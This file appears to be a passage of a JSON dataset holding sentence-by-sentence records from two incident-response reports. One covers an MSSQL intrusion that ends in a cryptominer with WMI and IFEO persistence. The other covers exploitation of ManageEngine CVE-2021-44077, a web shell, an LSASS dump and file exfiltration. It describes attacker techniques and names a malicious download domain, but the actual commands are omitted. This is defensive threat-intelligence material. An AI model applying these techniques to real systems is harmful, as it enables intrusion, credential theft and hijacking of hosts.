        "text": "In the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (xp_cmdshell).",
        "type": "",
        "report": "r-dfir-12",
        "line": 25,
        "index": 4968
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S26",
        "text": "This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.",
        "type": "",
        "report": "r-dfir-12",
        "line": 26,
        "index": 4969
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S27",
        "text": "An example of command execution following a successful authentication to SQL database using xp_cmdshell:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 27,
        "index": 4970
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S28",
        "text": "At a high level, the overall execution events can be depicted in the below diagram:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 28,
        "index": 4971
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S29",
        "text": "If we look into the Windows Application logs, specifically, the SQL Server event ID 15457, captures this as an \u2018xp_cmdshell\u2019 event.",
        "type": "",
        "report": "r-dfir-12",
        "line": 29,
        "index": 4972
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S30",
        "text": "Additionally, the SQL Server audit collection also captures similar events.",
        "type": "",
        "report": "r-dfir-12",
        "line": 30,
        "index": 4973
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S31",
        "text": "The first commands executed by the threat actors included using taskkill for various anti-virus software.",
        "type": "",
        "report": "r-dfir-12",
        "line": 31,
        "index": 4974
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S32",
        "text": "The threat actors also favored the execution of batch scripts on the compromised host.",
        "type": "",
        "report": "r-dfir-12",
        "line": 32,
        "index": 4975
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S33",
        "text": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
        "type": "",
        "report": "r-dfir-12",
        "line": 33,
        "index": 4976
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S34",
        "text": "A second set of commands were also echoed into a file named bigfile.txt.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 34,
        "index": 4977
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S35",
        "text": "Once complete, certutil was used to decode the text and create an executable file.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 35,
        "index": 4978
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S36",
        "text": "This executable was then used in executing the 1.bat batch file.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 36,
        "index": 4979
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S37",
        "text": "Pulling the hash of the file that was written, matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: https://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 37,
        "index": 4980
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S38",
        "text": "We believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.",
        "type": "",
        "report": "r-dfir-12",
        "line": 38,
        "index": 4981
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S39",
        "text": "Additionally, we noticed the attackers dropping a file named \u201cxitmf\u201d.",
        "type": "",
        "report": "r-dfir-12",
        "line": 39,
        "index": 4982
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S40",
        "text": "Looking into the file\u2019s content, we noticed that the header began with \u201cFOMB\u201d.",
        "type": "",
        "report": "r-dfir-12",
        "line": 40,
        "index": 4983
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S41",
        "text": "When flipping the header, it spells BMOF, which indicates a Binary Managed Object Format file.",
        "type": "",
        "report": "r-dfir-12",
        "line": 41,
        "index": 4984
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S42",
        "text": "BMOF is a compiled version of a Managed Object Format (MOF) file.",
        "type": "",
        "report": "r-dfir-12",
        "line": 42,
        "index": 4985
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S43",
        "text": "As per Microsoft\u2019s official documentation:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 43,
        "index": 4986
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S44",
        "text": "\u201cManaged Object Format (MOF) is the language used to describe Common Information Model (CIM) classes.\u201d\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 44,
        "index": 4987
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S45",
        "text": "MOF files are compiled using the Windows compiler tool mofcomp.",
        "type": "",
        "report": "r-dfir-12",
        "line": 45,
        "index": 4988
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S46",
        "text": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 46,
        "index": 4989
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S47",
        "text": "Using the same mofcomp utility, its possible to decompile the BMOF to extract the script, using this command provided by Matt Graeber:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 47,
        "index": 4990
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S48",
        "text": "Threat actors also transferred a Visual Basic Encoded (VBE) file that is executed on the host using cscript.exe.",
        "type": "",
        "report": "r-dfir-12",
        "line": 48,
        "index": 4991
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S49",
        "text": "Once run, the script would set up and execute the XMRig CoinMiner.",
        "type": "",
        "report": "r-dfir-12",
        "line": 49,
        "index": 4992
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S50",
        "text": "During the execution, the password 579562847 is provided as an argument.",
        "type": "",
        "report": "r-dfir-12",
        "line": 50,
        "index": 4993
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S51",
        "text": "We recognize that this is a VBE file from the file signature (\u201cmagic bytes\u201d) at the first four bytes of the top of the file.",
        "type": "",
        "report": "r-dfir-12",
        "line": 51,
        "index": 4994
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S52",
        "text": "We can decode the VBE file using CyberChef:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 52,
        "index": 4995
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S53",
        "text": "The script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 53,
        "index": 4996
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S54",
        "text": "Command interactions are done via WMI, for process discovery:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 54,
        "index": 4997
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S55",
        "text": "In the code, we observed further attempts to obfuscate sensitive attributable values:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 55,
        "index": 4998
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S56",
        "text": "Using the original password and some further de-obfuscation, we could decipher the values, in this case, the email address is:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 56,
        "index": 4999
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S57",
        "text": "[email protected]\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 57,
        "index": 5000
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S58",
        "text": "Some other deciphered values relate to coin mining pools:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 58,
        "index": 5001
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S59",
        "text": "We also observed another dropper.",
        "type": "",
        "report": "r-dfir-12",
        "line": 59,
        "index": 5002
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S60",
        "text": "Threat actors transferred the file ex.exe.",
        "type": "",
        "report": "r-dfir-12",
        "line": 60,
        "index": 5003
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S61",
        "text": "Ex.exe is an Unrar application that they used to extract more malicious artifacts:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 61,
        "index": 5004
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S62",
        "text": "The kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task.",
        "type": "",
        "report": "r-dfir-12",
        "line": 62,
        "index": 5005
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S63",
        "text": "See the contents of the script below:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 63,
        "index": 5006
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S64",
        "text": "Something to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.",
        "type": "",
        "report": "r-dfir-12",
        "line": 64,
        "index": 5007
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S65",
        "text": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "type": "",
        "report": "r-dfir-12",
        "line": 65,
        "index": 5008
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S66",
        "text": "We see the creation of a new account and adding this account to the local administrators group.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 66,
        "index": 5009
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S67",
        "text": "They also made remote RDP connections possible by changing the fDenyTSConnections and UserAuthentication values to 0.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 67,
        "index": 5010
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S68",
        "text": "We later see the threat actors writing another batch file to disk and executing it.",
        "type": "",
        "report": "r-dfir-12",
        "line": 68,
        "index": 5011
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S69",
        "text": "The kit.bat script contained a scheduled task that would run the kit.bat script on an hourly basis.",
        "type": "",
        "report": "r-dfir-12",
        "line": 69,
        "index": 5012
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S70",
        "text": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "type": "",
        "report": "r-dfir-12",
        "line": 70,
        "index": 5013
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S71",
        "text": "This was used as a method of persistence.",
        "type": "",
        "report": "r-dfir-12",
        "line": 71,
        "index": 5014
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S72",
        "text": "The VBScript would execute every day at 23:00 of the host local time.",
        "type": "",
        "report": "r-dfir-12",
        "line": 72,
        "index": 5015
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S73",
        "text": "Decompiled .mof file containing the WMI event subscription.",
        "type": "",
        "report": "r-dfir-12",
        "line": 73,
        "index": 5016
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S74",
        "text": "Breaking down the above screenshot, the WMI event subscription contains the below malicious EventConsumer and EventFilter classes:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 74,
        "index": 5017
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S75",
        "text": "Looking into the VBScript, we notice that it is reaching out to the domain mymst007[.]info on port 4000 to download one more file and save it as temp file.",
        "type": "",
        "report": "r-dfir-12",
        "line": 75,
        "index": 5018
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S76",
        "text": "We used the below python code to emulate the VBScript and download the next stage payload:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 76,
        "index": 5019
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S77",
        "text": "The final method of persistence we observed was the addition of an entry into the Image File Execution Option (IFEO) registry key.",
        "type": "",
        "report": "r-dfir-12",
        "line": 77,
        "index": 5020
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S78",
        "text": "By changing the Debugger value to a different executable, an attacker used IFEO to launch a program other than the intended one.",
        "type": "",
        "report": "r-dfir-12",
        "line": 78,
        "index": 5021
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S79",
        "text": "In this case, threat actors modified the below registry key to launch the miner executable (smss.exe) instead of the svchost.exe binary.",
        "type": "",
        "report": "r-dfir-12",
        "line": 79,
        "index": 5022
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S80",
        "text": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
        "type": "",
        "report": "r-dfir-12",
        "line": 80,
        "index": 5023
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S81",
        "text": "This was used in this intrusion to run the batch file with the following command:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 81,
        "index": 5024
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S82",
        "text": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "type": "",
        "report": "r-dfir-12",
        "line": 82,
        "index": 5025
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S83",
        "text": "The commands targeted the below processes:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 83,
        "index": 5026
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S84",
        "text": "The privilege escalation tool the threat actors brought with them was written as a text file and then decoded using certutil into a binary file.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 84,
        "index": 5027
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S85",
        "text": "As we can see from the contents of the 1.bat script, the threat actors are adding a new local administrator user and they proceed with hiding the user account by adding it to the registry using \u201cSpecial Accounts\u201c.",
        "type": "",
        "report": "r-dfir-12",
        "line": 85,
        "index": 5028
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S86",
        "text": "Through the execution of the initial batch script, 1.bat, they also disabled the User Access Control(UAC) remote restriction by setting the registry key value to \u201c1\u201d.",
        "type": "",
        "report": "r-dfir-12",
        "line": 86,
        "index": 5029
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S87",
        "text": "Threat actors also enabled Wdigest.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 87,
        "index": 5030
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S88",
        "text": "After many files were added to the system the threat actors included commands to remove them once their execution was finished.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 88,
        "index": 5031
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S89",
        "text": "During the initial access credentials were obtained via a brute-force attack against the exposed MSSQL server.",
        "type": "",
        "report": "r-dfir-12",
        "line": 89,
        "index": 5032
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S90",
        "text": "No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 90,
        "index": 5033
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S91",
        "text": "We observed that the domain mymst007[.]info is used to download further payloads.",
        "type": "",
        "report": "r-dfir-12",
        "line": 91,
        "index": 5034
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S92",
        "text": "The domain was created five years ago.",
        "type": "",
        "report": "r-dfir-12",
        "line": 92,
        "index": 5035
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S93",
        "text": "We have seen similar reports that make mention of the same infrastructure.",
        "type": "",
        "report": "r-dfir-12",
        "line": 93,
        "index": 5036
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S94",
        "text": "Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 94,
        "index": 5037
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S95",
        "text": "Connections related to the domain \u2013 mymst007[.]info\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 95,
        "index": 5038
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S96",
        "text": "The impact was concentrated on this one host.",
        "type": "",
        "report": "r-dfir-12",
        "line": 96,
        "index": 5039
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S97",
        "text": "We did not see any further activity in this case.",
        "type": "",
        "report": "r-dfir-12",
        "line": 97,
        "index": 5040
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S98",
        "text": "The compromised host had XMRig miner installed and running.",
        "type": "",
        "report": "r-dfir-12",
        "line": 98,
        "index": 5041
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S99",
        "text": "The miner was also connecting to cryptomining pool such as minergate[.]com.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 99,
        "index": 5042
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S0",
        "text": "The intrusion began with the exploitation of an internet-facing instance of ManageEngine SupportCenter Plus via the CVE-2021-44077 vulnerability.",
        "type": "",
        "report": "r-dfir-13",
        "line": 0,
        "index": 5043
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S1",
        "text": "The threat actor successfully exploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web shell in an internet accessible directory.",
        "type": "",
        "report": "r-dfir-13",
        "line": 1,
        "index": 5044
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S2",
        "text": "The exploit we witnessed looks very similar to a publicly available POC exploit on GitHub.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 2,
        "index": 5045
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S3",
        "text": "The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell.",
        "type": "",
        "report": "r-dfir-13",
        "line": 3,
        "index": 5046
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S4",
        "text": "Enumeration on the system included querying network configuration, a list of domain joined computers, user and OS information, and current user sessions on the beachhead.",
        "type": "",
        "report": "r-dfir-13",
        "line": 4,
        "index": 5047
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S5",
        "text": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
        "type": "",
        "report": "r-dfir-13",
        "line": 5,
        "index": 5048
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S6",
        "text": "Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system.",
        "type": "",
        "report": "r-dfir-13",
        "line": 6,
        "index": 5049
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S7",
        "text": "In this case, the threat actor had access to the user\u2019s plaintext credentials as a result of WDigest authentication being previously enabled.",
        "type": "",
        "report": "r-dfir-13",
        "line": 7,
        "index": 5050
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S8",
        "text": "The following day the threat actor downloaded ekern.exe, which was a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server.",
        "type": "",
        "report": "r-dfir-13",
        "line": 8,
        "index": 5051
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S9",
        "text": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "type": "",
        "report": "r-dfir-13",
        "line": 9,
        "index": 5052
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S10",
        "text": "From the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server.",
        "type": "",
        "report": "r-dfir-13",
        "line": 10,
        "index": 5053
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S11",
        "text": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 11,
        "index": 5054
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S12",
        "text": "These files, were critical to the business and it\u2019s partner.",
        "type": "",
        "report": "r-dfir-13",
        "line": 12,
        "index": 5055
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S13",
        "text": "The documents were selectively chosen as if the attackers were looking for specific material.",
        "type": "",
        "report": "r-dfir-13",
        "line": 13,
        "index": 5056
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S14",
        "text": "When it came time to exfiltrate certain files or folders, one folder of the utmost importance was exfiltrated while passing on other partner folders and files.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 14,
        "index": 5057
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S15",
        "text": "Besides the files and folders mentioned, internal machine certs were reviewed and later exfiltrated.",
        "type": "",
        "report": "r-dfir-13",
        "line": 15,
        "index": 5058
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S16",
        "text": "The exfiltrated information has not been found in any public dumps or sales to date.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 16,
        "index": 5059
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S17",
        "text": "The threat actors were evicted from the network soon after stealing this information.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 17,
        "index": 5060
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S18",
        "text": "Initial access began with the exploitation of ManageEngine SupportCenter Plus via CVE-2021-44077, an unauthenticated remote code execution vulnerability.",
        "type": "",
        "report": "r-dfir-13",
        "line": 18,
        "index": 5061
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S19",
        "text": "There are two main HTTP requests responsible for this exploit.",
        "type": "",
        "report": "r-dfir-13",
        "line": 19,
        "index": 5062
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S20",
        "text": "The first request sent a POST containing the contents of a PE file which was written to:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 20,
        "index": 5063
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S21",
        "text": "The second request, attempted to install Zoho\u2019s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file.",
        "type": "",
        "report": "r-dfir-13",
        "line": 21,
        "index": 5064
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S22",
        "text": "More details regarding this are covered in the Execution section.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 22,
        "index": 5065
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S23",
        "text": "The exploitation attempts against the internet-facing server arrived from two Tor exit nodes.",
        "type": "",
        "report": "r-dfir-13",
        "line": 23,
        "index": 5066
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S24",
        "text": "Each step of the exploit was observed originating from a different TOR exit node.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 24,
        "index": 5067
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S25",
        "text": "The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho\u2019s Site24x7 performance monitoring tool.",
        "type": "",
        "report": "r-dfir-13",
        "line": 25,
        "index": 5068
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S26",
        "text": "Support Center Plus will do this by invoking the installation via msiexec.exe by running:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 26,
        "index": 5069
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S27",
        "text": "The running path of Support Center Plus at the time this command runs is C:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\ which means the msiexec.exe uploaded by the threat actor will be favored rather than the legitimate Microsoft utility.",
        "type": "",
        "report": "r-dfir-13",
        "line": 27,
        "index": 5070
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S28",
        "text": "Once the malicious msiexec.exe is executed an embedded Java payload will be decoded and written to:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 28,
        "index": 5071
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S29",
        "text": "The parameters passed to msiexec.exe are never used and the Site24x7 performance monitoring tool is never installed.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 29,
        "index": 5072
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S30",
        "text": "The web shell was written to:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 30,
        "index": 5073
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S31",
        "text": "This location is web accessible which means the threat actors can interact with the web shell through a web browser from the internet.",
        "type": "",
        "report": "r-dfir-13",
        "line": 31,
        "index": 5074
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S32",
        "text": "Here are a few commands run through the web shell.",
        "type": "",
        "report": "r-dfir-13",
        "line": 32,
        "index": 5075
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S33",
        "text": "The following diagram visually illustrates the CVE-2021-44077 exploitation and execution process.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 33,
        "index": 5076
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S34",
        "text": "The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created.",
        "type": "",
        "report": "r-dfir-13",
        "line": 34,
        "index": 5077
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S35",
        "text": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
        "type": "",
        "report": "r-dfir-13",
        "line": 35,
        "index": 5078
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S36",
        "text": "The two msiexec files included the same web shell but had some differing characteristics.",
        "type": "",
        "report": "r-dfir-13",
        "line": 36,
        "index": 5079
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S37",
        "text": "Here is some information on the first attempted msiexec file which failed.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 37,
        "index": 5080
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S38",
        "text": "The main difference being the interesting PDB path m:\\work\\shellll\\ and the differing .NET versions.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 38,
        "index": 5081
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S39",
        "text": "We can see from the Catalina.txt log that when the threat actors run certain commands such as fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds) and creates a warning message:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 39,
        "index": 5082
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S40",
        "text": "The web shell dropped to the beachhead during the exploitation process was the only form of persistence observed during the intrusion.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 40,
        "index": 5083
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S41",
        "text": "There are multiple remote interaction capabilities in the Java web shell, including:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 41,
        "index": 5084
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S42",
        "text": "- Execution of commands\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 42,
        "index": 5085
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S43",
        "text": "- View and download files\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 43,
        "index": 5086
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S44",
        "text": "- Creation of new files\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 44,
        "index": 5087
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S45",
        "text": "Privilege escalation was not needed on the beachhead ManageEngine server as the exploit provided the execution of commands through the web shell SYSTEM level privileges.",
        "type": "",
        "report": "r-dfir-13",
        "line": 45,
        "index": 5088
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S46",
        "text": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "type": "",
        "report": "r-dfir-13",
        "line": 46,
        "index": 5089
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S47",
        "text": "More on the dumping method in the Credential Access section.",
        "type": "",
        "report": "r-dfir-13",
        "line": 47,
        "index": 5090
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S48",
        "text": "During the initial access, an attacker uploaded a binary named msiexec.exe onto the system.",
        "type": "",
        "report": "r-dfir-13",
        "line": 48,
        "index": 5091
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S49",
        "text": "This binary isn\u2019t the legitimate Microsoft msiexec.exe, rather it is a dropper that contains an embedded encoded web shell.",
        "type": "",
        "report": "r-dfir-13",
        "line": 49,
        "index": 5092
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S50",
        "text": "The naming of this executable has the benefit of blending into the environment and appearing legitimate, while also being critical to the exploitation of CVE-2021-44077.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 50,
        "index": 5093
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S51",
        "text": "During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section).",
        "type": "",
        "report": "r-dfir-13",
        "line": 51,
        "index": 5094
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S52",
        "text": "After exfiltrating the LSASS dump, the attacker deleted the dump file to hide their traces.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 52,
        "index": 5095
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S53",
        "text": "Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH.",
        "type": "",
        "report": "r-dfir-13",
        "line": 53,
        "index": 5096
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S54",
        "text": "Ekern.exe is the plink.exe tool renamed in order to stay under the radar.",
        "type": "",
        "report": "r-dfir-13",
        "line": 54,
        "index": 5097
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S55",
        "text": "Furthermore, the name ekern.exe is similar to the name of a known component of ESET named ekrn.exe.",
        "type": "",
        "report": "r-dfir-13",
        "line": 55,
        "index": 5098
    },
    {
